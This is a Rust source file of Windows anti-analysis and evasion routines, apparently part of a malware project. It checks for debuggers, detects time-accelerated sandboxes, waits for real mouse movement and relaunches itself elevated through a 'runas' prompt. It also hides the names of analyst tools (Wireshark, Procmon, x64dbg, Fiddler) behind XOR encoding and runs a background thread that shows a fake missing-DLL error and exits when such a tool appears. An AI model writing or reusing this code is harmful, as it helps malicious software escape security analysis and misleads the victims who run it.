use std::time::{Duration, Instant};
use windows::Win32::System::Diagnostics::Debug::IsDebuggerPresent;
use windows::Win32::System::SystemInformation::GetTickCount64;
use windows::Win32::UI::WindowsAndMessaging::GetCursorPos;
use windows::Win32::Foundation::{POINT, HINSTANCE, HWND};
use windows::Win32::System::Diagnostics::ToolHelp::{CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS};
use windows::Win32::UI::Shell::ShellExecuteA;
use windows::core::PCSTR;
use windows::Win32::System::Threading::{OpenProcessToken, GetCurrentProcess};
use windows::Win32::Security::{GetTokenInformation, TokenElevation, TOKEN_QUERY, TOKEN_ELEVATION};
use std::ffi::c_void;

/// Checks for debuggers using Win32 API
pub fn check_debugger() -> bool {
    unsafe { IsDebuggerPresent().as_bool() }
}

/// Detects "Time-Warping" sandboxes
pub fn detect_time_warping() -> bool {
    unsafe {
        let start = GetTickCount64();
        std::thread::sleep(Duration::from_millis(2000));
        let end = GetTickCount64();
        if end - start < 1500 { return true; }
    }
    false
}

/// Waits for mouse movement
pub fn verify_human_presence() {
    unsafe {
        let mut start_pos = POINT::default();
        GetCursorPos(&mut start_pos);
        let threshold = 50;
        let mut checks = 0;
        loop {
            let mut current_pos = POINT::default();
            GetCursorPos(&mut current_pos);
            let dx = (current_pos.x - start_pos.x).abs();
            let dy = (current_pos.y - start_pos.y).abs();
            if dx > threshold || dy > threshold { break; }
            std::thread::sleep(Duration::from_millis(100));
            checks += 1;
            if checks > 600 { break; }
        }
    }
}

/// Checks if the current process has Administrator privileges
pub fn am_i_admin() -> bool {
    unsafe {
        let mut token_handle = windows::Win32::Foundation::HANDLE::default();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token_handle).is_ok() {
            let mut elevation = TOKEN_ELEVATION::default();
            let mut size = 0;
            if GetTokenInformation(token_handle, TokenElevation, Some(&mut elevation as *mut _ as *mut c_void), std::mem::size_of::<TOKEN_ELEVATION>() as u32, &mut size).is_ok() {
                return elevation.TokenIsElevated != 0;
            }
        }
    }
    false
}

/// Relaunches the application with Administrator privileges
pub fn elevate_self() {
    unsafe {
        use std::ffi::CString;
        if let Ok(exe_path) = std::env::current_exe() {
            let exe_str = CString::new(exe_path.to_string_lossy().as_bytes()).unwrap();
            let verb = CString::new("runas").unwrap();
            
            ShellExecuteA(
                HWND::default(),
                PCSTR(verb.as_ptr() as *const u8),
                PCSTR(exe_str.as_ptr() as *const u8),
                PCSTR(std::ptr::null()),
                PCSTR(std::ptr::null()),
                windows::Win32::UI::WindowsAndMessaging::SW_SHOWNORMAL
            );
        }
        std::process::exit(0);
    }
}

use crate::obfuscation;

// XOR Key: 0x55
const WIRESHARK_BYTES: &[u8] = &[34, 60, 39, 48, 38, 61, 52, 39, 62];
const PROCMON_BYTES: &[u8] = &[37, 39, 58, 54, 56, 58, 59];
const X64DBG_BYTES: &[u8] = &[45, 99, 97, 49, 55, 50];
const FIDDLER_BYTES: &[u8] = &[51, 60, 49, 49, 57, 48, 39];
const HTTPDEBUGGER_BYTES: &[u8] = &[61, 33, 33, 37, 49, 48, 55, 32, 50, 50, 48, 39];
const ERROR_BYTES: &[u8] = &[16, 39, 39, 58, 39, 111, 117, 1, 61, 48, 117, 54, 58, 49, 48, 117, 48, 57, 48, 54, 32, 33, 60, 58, 57, 117, 54, 52, 59, 59, 58, 33, 117, 39, 38, 56, 117, 54, 34, 48, 117, 34, 48, 57, 60, 60, 57, 117, 35, 48, 54, 52, 32, 38, 48, 117, 107, 54, 37, 36, 59, 33, 22, 53, 53, 49, 100, 32, 49, 49, 117, 34, 52, 38, 117, 59, 58, 33, 117, 51, 58, 32, 59, 49, 123];

/// Scans for "Hunter" processes using Obfuscated Strings
pub fn check_hunter_processes() -> bool {
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snapshot.is_err() { return false; }
        let snapshot = snapshot.unwrap();

        let mut entry = PROCESSENTRY32::default();
        entry.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;

        let key = 0x55;
        let wireshark = obfuscation::decode(WIRESHARK_BYTES, key);
        let procmon = obfuscation::decode(PROCMON_BYTES, key);
        let x64dbg = obfuscation::decode(X64DBG_BYTES, key);
        let fiddler = obfuscation::decode(FIDDLER_BYTES, key);
        let httpdebugger = obfuscation::decode(HTTPDEBUGGER_BYTES, key);
        
        if Process32First(snapshot, &mut entry).is_ok() {
            loop {
                // Convert to lowercase String for comparison
                let name = std::ffi::CStr::from_ptr(entry.szExeFile.as_ptr() as *const i8)
                    .to_string_lossy()
                    .to_lowercase();
                
                // Compare against decoded strings
                if name.contains(&wireshark) || 
                   name.contains(&procmon) || 
                   name.contains(&x64dbg) || 
                   name.contains(&fiddler) ||
                   name.contains(&httpdebugger) {
                    return true; // Hunter Found
                }

                if Process32Next(snapshot, &mut entry).is_err() { break; }
            }
        }
    }
    false
}

/// Simulation of a VCRUNTIME140.dll missing error
pub fn crash_dummy() {
    let key = 0x55;
    let msg = obfuscation::decode(ERROR_BYTES, key);
    println!("{}", msg);
}

/// Spawns a background thread that continuously checks for Hunter processes.
/// If found, it triggers the Fake Error immediately.
pub fn start_shadow_watcher() {
    std::thread::spawn(|| {
        loop {
            if check_hunter_processes() {
                crash_dummy();
                std::process::exit(1);
            }
            // Check every 500ms. Frequent enough to catch them starting, 
            // sparse enough to use 0% CPU.
            std::thread::sleep(Duration::from_millis(500));
        }
    });
}
